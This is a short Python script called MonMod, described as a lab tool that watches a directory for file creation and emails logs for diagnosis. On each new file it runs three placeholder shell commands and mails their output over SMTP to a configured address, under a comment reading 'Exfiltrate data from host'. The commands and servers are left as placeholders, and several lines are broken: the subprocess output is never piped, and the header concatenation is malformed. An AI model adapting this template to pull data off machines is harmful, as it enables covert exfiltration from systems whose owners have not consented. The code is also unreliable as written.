# TITLE: MonMod
# AUTHOR: James Daniel (james-daniel)
# ATTN: Framework to monitor modifications to FS and email logs for diagnosis.
# ATTN: Replace values of constants with corresponding values.
# ATTN: For legal purposes only! Intended for a laboratory environment.

try:
    import smtplib
    import subprocess
    import getpass
    from watchdog.observers import Observer
    from watchdog.events import LoggingEventHandler
    from watchdog.events import FileSystemEventHandler
except ImportError:
    print("Caught ImportError")

class evt_hander(FileSystemEventHandler):
    def __init__(self, observer, fileName):
        self.observer = observer
        self.filename = fileName
    def on_created(self, event):
        SENDER_PASSWORD = getpass.getpass()
        sendMail(SENDER_PASSWORD)

def pollSys():
    path = '<PATH>'
    # Instantiate observer and event handler objects
    obs = Observer()
    fs_evt_handler = evt_hander(obs, path)
    # Set scope of monitoring to path.
    obs.schedule(fs_evt_handler, path, recursive=True)
    # Start observer and wait until thread fully terminates.
    obs.start()
    obs.join()

def sendMail(sender_password):
    # Connect to SMTP server.
    RECEIVER_EMAIL = '<EMAIL>'
    SENDER_EMAIL = '<EMAIL2>'
    SMTP_SRV = smtplib.SMTP("<SMTP_SERVER_FQDN>", 587)
    SMTP_SRV.ehlo()
    SMTP_SRV.starttls()
    SMTP_SRV.ehlo()
    SMTP_SRV.login(SENDER_EMAIL,sender_password)

    # Exfiltrate data from host
    stdout1 = subprocess.Popen(['<BASH>'])
    stdout2 = subprocess.Popen(['<BASH>'])
    stdout3 = subprocess.Popen(['<BASH>'])
    output = stdout1.stdout.read()
    output2 = stdout2.stdout.read()
    output3 = stdout3.stdout.read()
    header = 'To: ' + RECEIVER_EMAIL + '\n' + 'From: ' + SENDER_EMAIL + '\n'
    + 'Subject: <SUBJECT>\n'
    message = header + '\n ' + output + '\n\n' + output2 + '\n\n' + output3
    SMTP_SRV.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message)
    SMTP_SRV.close()